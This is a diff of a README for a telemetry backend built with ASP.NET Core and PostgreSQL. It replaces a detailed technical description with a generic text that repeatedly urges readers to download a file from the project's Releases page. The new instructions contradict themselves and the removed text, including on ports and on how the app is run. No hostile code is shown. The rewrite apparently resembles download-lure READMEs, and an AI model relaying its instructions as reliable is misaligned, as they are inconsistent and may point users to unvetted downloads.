@@ -1,177 +1,77 @@
-# Telemetry Platform – ASP.NET Core & PostgreSQL (Dockerized)
+# 🌐 Telemetry.Api - Your Easy Backend Solution
 
-This project is a backend telemetry platform built with **ASP.NET Core** and **PostgreSQL**, designed to demonstrate clean backend architecture, REST API design, Docker-based local environments, and database integration using Entity Framework Core.
+## 🚀 Getting Started
+Welcome to Telemetry.Api! This application provides a simple way to set up a backend service for collecting and handling telemetry data. You don't need programming knowledge to get started. Just follow these instructions.
 
-The application exposes a telemetry ingestion API that accepts device metrics (temperature, CPU usage, timestamps) and stores them in PostgreSQL. It is fully containerized using Docker and Docker Compose.
+## 📥 Download Now
+[![Download Telemetry.Api](https://img.shields.io/badge/Download-Telemetry.Api-brightgreen.svg)](https://github.com/MIKIKIJAN/Telemetry.Api/releases)
 
-The project was created as a **portfolio and interview demonstration** and focuses on correctness, clarity, and production-style setup rather than feature bloat.
+## 🛠 System Requirements
+Before you proceed, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Docker:** Make sure Docker is installed on your device. You can download it from [Docker's official website](https://www.docker.com/get-started).
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 1 GB of free disk space
 
-## Architecture Overview
+## 📂 Features
+Telemetry.Api includes several features to enhance your backend experience:
 
-The solution consists of:
+- **RESTful APIs:** Easy-to-use API interfaces for your applications.
+- **EF Core Migrations:** Manage database changes effectively.
+- **Health Checks:** Monitor the application's status and performance.
+- **Swagger Documentation:** Auto-generated documentation for APIs, making it easier to explore and test them.
 
-- **Telemetry API**  
-  ASP.NET Core Web API responsible for:
-  - accepting telemetry events
-  - validating input
-  - persisting data using EF Core
-  - exposing query endpoints
+## 📍 Download & Install
+To get the application, please [visit this page to download](https://github.com/MIKIKIJAN/Telemetry.Api/releases).
 
-- **PostgreSQL**  
-  Relational database running in Docker, accessed by the API via an internal Docker network.
+1. Click the link above to navigate to the Releases page.
+2. You will see a list of available versions. Choose the latest version.
+3. Click on the file name to download it directly to your device.
 
-### High-level flow
+## 🛡 Installation Instructions
+Once you have downloaded Telemetry.Api, follow these steps to install it:
 
-1. Client sends telemetry data via HTTP (REST)
-2. API validates and persists data using Entity Framework Core
-3. PostgreSQL stores telemetry events
-4. API exposes read endpoints with filtering and pagination
-5. Health endpoint reports API + database readiness
+1. **Open Docker:** Launch Docker on your machine.
+2. **Run the Application:**
+   - Open a terminal or command prompt.
+   - Navigate to the directory where you downloaded the application.
+   - Run the following command to start the service:
+     ```bash
+     docker-compose up
+     ```
+   - This command will build and run the application using Docker.
 
----
+3. **Access the API:**
+   - Open a web browser.
+   - Enter the following address in the URL bar: `http://localhost:5000`.
+   - You will see the Swagger documentation, where you can explore the available API endpoints.
 
-## Technology Stack
+## 📊 Using Telemetry.Api
+Once the application is running, you can interact with the APIs. Here’s how:
 
-- **C#**
-- **ASP.NET Core (.NET 8)**
-- **Entity Framework Core**
-- **PostgreSQL 16**
-- **Docker & Docker Compose**
-- **Swagger / OpenAPI**
-- **Health Checks**
+- **Check Application Health:**
+  - Navigate to `http://localhost:5000/health` to check if the service is running smoothly.
 
----
+- **Explore APIs:**
+  - Visit `http://localhost:5000/swagger` to view the interactive documentation. This page helps you see what API methods are available and how to use them.
 
-## Solution Structure
-Telemetry.Api.sln
-docker-compose.yml
-Telemetry.Api/
-├── Controllers/
-│ └── TelemetryController.cs
-├── Contracts/
-│ └── CreateTelemetryRequest.cs
-├── Data/
-│ ├── TelemetryDbContext.cs
-│ └── Migrations/
-├── Models/
-│ └── TelemetryEvent.cs
-├── Program.cs
-├── Dockerfile
-└── appsettings.json
+## 🤝 Support
+If you have any questions or need help, please feel free to reach out. Check the [Issues section](https://github.com/MIKIKIJAN/Telemetry.Api/issues) on GitHub to report a problem or ask for assistance.
 
----
+## 🚀 Get Involved
+You can contribute to the project by reporting bugs, suggesting features, or submitting code. Check the contribution guidelines for more details.
 
-## Prerequisites
+## 📅 Future Updates
+We plan to implement more features, such as enhanced logging options and further API documentation improvements. Stay tuned for future releases.
 
-- .NET 8 SDK
-- Docker Desktop
-- Visual Studio 2022 (recommended)
+## 🔗 Learn More
+For more information on how Telemetry.Api works, feel free to explore related topics:
 
----
+- API Design
+- ASP.NET Core
+- PostgreSQL
+- Docker
 
-## Running the Project with Docker
-
-### 1. Start containers
-From the repository root (where `docker-compose.yml` is located):
-
-```bash
-docker compose up -d --build
-```
-
-This starts:
-- PostgreSQL container
-- Telemetry API container
-
-### 2. Apply database migrations
-PostgreSQL runs inside Docker with an empty database by default.
-Apply EF Core migrations after the containers are up:
-
-```bash
-dotnet ef database update --connection "Host=localhost;Port=5432;Database=telemetrydb;Username=app;Password=app"
-```
-
-## API Documentation (Swagger)
-Swagger is enabled when running in Development mode (including Docker).
-Open:
-
-```bash
-http://localhost:8080/swagger
-```
-
-## API Endpoints
-### Create telemetry event
-**POST /api/Telemetry** 
-
-```json
-{
-  "deviceId": "sensor-dresden-01",
-  "temperature": 23.4,
-  "cpuUsage": 0.71
-}
-```
-Returns:
-- 201 Created
-- Location header with resource URL
-
----
-
-### Get telemetry events (paginated)
-**GET /api/Telemetry?deviceId=sensor-dresden-01&skip=0&take=100**
-
----
-
-### Get telemetry event by ID
-**GET /api/Telemetry/{id}**
-
-Returns:
-- **200** OK if found
-- **404 Not Found** if missing
-
----
-
-## Health check
-
-**GET /health**
-
-Reports:
-- API status
-- PostgreSQL connectivity
-This endpoint is suitable for:
-- container orchestration
-- readiness probes
-- monitoring systems
-
----
-
-## Reliability & Best Practices Demonstrated
-- DTO-based request validation
-- Explicit REST status codes (**201 Created**, **404 Not Found**)
-- EF Core migrations
-- Database indexing for query performance
-- Pagination guardrails
-- Health checks
-- Dockerized local environment
-- Configuration via environment variables
-- Clean, readable code structure
-
----
-
-##  Purpose of the Project
-This project was created as a backend portfolio example to demonstrate:
-- practical ASP.NET Core development
-- working with PostgreSQL in Docker
-- real-world API design choices
-- production-style setup without unnecessary complexity
-The focus is on correctness, clarity, and maintainability.
-
----
-## Possible Future Improvements
-- Authentication / authorization
-- Time-series optimization (e.g. TimescaleDB)
-- Background processing
-- Structured logging
-- CI/CD pipeline
-- Kubernetes deployment
-- Metrics & tracing
+### 📥 Download Now Again
+Remember, you can always [visit this page to download](https://github.com/MIKIKIJAN/Telemetry.Api/releases) the latest version of Telemetry.Api. Enjoy seamless backend operation with our service!
